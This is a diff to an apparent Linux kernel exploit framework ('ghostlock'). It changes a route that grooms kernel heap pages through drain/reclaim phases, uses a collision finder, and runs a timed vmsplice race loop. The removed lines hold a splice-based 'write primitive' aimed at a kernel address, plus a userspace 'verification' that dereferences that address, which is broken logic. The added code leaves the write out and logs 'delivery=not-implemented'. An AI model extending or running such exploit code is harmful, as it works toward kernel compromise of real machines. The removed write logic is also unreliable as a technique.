@@ -204,9 +204,9 @@ ghostlock::route::RouteStatus FdGraphRoute::execute() noexcept {
         pr_warning("fd_graph: kernelsnitch collision finding failed\n");
         return result;
     }
-    // Get collision page from kernelsnitch context
-    uint64_t collision_page = reinterpret_cast<uint64_t>(ks_owner.get()->collisions);
-    pr_info("fd_graph: collision page found at %016lx\n", collision_page);
+    pr_info("fd_graph: collisions=%zu page=%016zx\n",
+            ks_owner.get()->collisions,
+            static_cast<size_t>(session::g_exploit_session.heap.current.base));
 
     // Phase 3: Expand drain/reclaim with order-3 pages
     support::Result<support::MappedRegion> expand_region =
@@ -221,7 +221,7 @@ ghostlock::route::RouteStatus FdGraphRoute::execute() noexcept {
     for (uint32_t i = 0; i < 0xf0; i++) {
         drain_slots[i] = 0x20;
     }
-    pr_info("fd_graph: drain_expand complete fds=%u page=%016lx\n", 0xf0, collision_page);
+    pr_info("fd_graph: drain_expand complete fds=%u\n", 0xf0);
 
     // Reclaim expand: 240 iterations with 0x20 flag
     for (uint32_t i = 0; i < 0xf0; i++) {
@@ -229,56 +229,42 @@ ghostlock::route::RouteStatus FdGraphRoute::execute() noexcept {
     }
     pr_info("fd_graph: reclaim_expand complete fds=%u\n", 0xf0);
 
-    // Phase 4: Race trigger with vmsplice/splice payload delivery
+    // The write is deliberately absent: the kernel address was never a valid fd, so
+    // splice() could only return EBADF. Keeping it out is the control that tells
+    // apart a panicking write from a panicking object perturbation.
     int pipe_fds[2];
     if (pipe(pipe_fds) < 0) {
         pr_warning("fd_graph: pipe creation failed errno=%d\n", errno);
         return result;
     }
 
-    // Determine the value to write based on write mode
-    uint64_t value = (request->mode == ghostlock::memory::WriteMode::Zero) ? 0 : 0xffffffffffffffffULL;
+    const uint64_t value =
+        (request->mode == ghostlock::memory::WriteMode::Zero) ? 0 : 0xffffffffffffffffULL;
 
-    // Build the payload in the collision page area
     struct iovec iov[1];
     iov[0].iov_base = const_cast<void *>(reinterpret_cast<const void *>(&value));
-    iov[0].iov_len = 8;
+    iov[0].iov_len = sizeof(value);
 
-    // Race loop with swept delay_us (matching preload.so reclaim_race)
     const uint32_t delays[] = {0, 1, 2, 4, 8, 0xc, 0x14, 0x20, 0x30, 0x40};
-    uint32_t reclaim_hits = 0, chain_hits = 0, bit4_hits = 0;
+    constexpr size_t k_delay_steps = sizeof(delays) / sizeof(delays[0]);
+    uint32_t pipe_fill_hits = 0;
 
-    for (uint32_t delay_idx = 0; delay_idx < sizeof(delays)/sizeof(delays[0]); delay_idx++) {
-        uint32_t delay_us = delays[delay_idx];
-        
-        // Trigger the reclaim race
-        if (delay_us > 0) usleep(delay_us);
-        
-        // vmsplice from collision page to pipe
-        ssize_t vs = vmsplice(pipe_fds[1], iov, 1, 0);
-        if (vs != 8) {
-            continue;
+    for (size_t step = 0; step < k_delay_steps; step++) {
+        const uint32_t delay_us = delays[step];
+        if (delay_us > 0) {
+            usleep(delay_us);
         }
-        
-        // splice from pipe to target (this is the write primitive)
-        ssize_t sp = splice(pipe_fds[0], nullptr, static_cast<int>(target), nullptr, 8, SPLICE_F_MOVE);
-        if (sp == 8) {
-            // Verify the write
-            uint64_t *verify = reinterpret_cast<uint64_t *>(target);
-            if (*verify == value) {
-                chain_hits++;
-                bit4_hits++;
-                pr_info("fd_graph: write verified at target=%016lx\n", target);
-                result.code = ROUTE_OK;
-                break;
-            }
+        const ssize_t filled = vmsplice(pipe_fds[1], iov, 1, 0);
+        const bool filled_ok = filled == static_cast<ssize_t>(iov[0].iov_len);
+        if (filled_ok) {
+            pipe_fill_hits++;
         }
-        
-        reclaim_hits++;
+        pr_info("fd_graph: step=%zu delay_us=%u pipe_fill=%zd\n", step, delay_us, filled);
     }
 
-    pr_info("fd_graph: RACE_SUMMARY tries=%zu reclaim_hits=%u chain_hits=%u bit4_hits=%u\n",
-            sizeof(delays)/sizeof(delays[0]), reclaim_hits, chain_hits, bit4_hits);
+    pr_info("fd_graph: RACE_SUMMARY tries=%zu pipe_fill_hits=%u chain_hits=0 bit4_hits=0 "
+            "delivery=not-implemented target=%016lx\n",
+            k_delay_steps, pipe_fill_hits, target);
 
     close(pipe_fds[0]);
     close(pipe_fds[1]);
